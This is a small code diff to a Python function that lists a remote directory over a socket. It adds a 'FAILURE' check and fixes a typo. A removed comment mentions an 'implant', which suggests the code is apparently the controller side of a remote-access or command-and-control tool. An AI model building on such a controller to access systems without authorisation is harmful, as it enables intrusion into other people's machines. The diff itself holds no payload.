@@ -28,15 +28,15 @@ def dirList(sock, dirPath):
         while (data != "SUCCESS"):
             if (data != "" and data != " "):
                 print("\t%s" % data)
+            if (data == "FAILURE"):
+                print("Dir list returned failure!")
+                return FAILURE
             data = sock.recv(1024)
             data = data.strip()
             data = data.decode('utf-8')
 
 
-        print("\nSuccessful dir ist!\n")
-
-
-        #print("Implant returned FAILURE!\n")
+        print("\nSuccessful dir list!\n")
 
 
     except Exception as e:
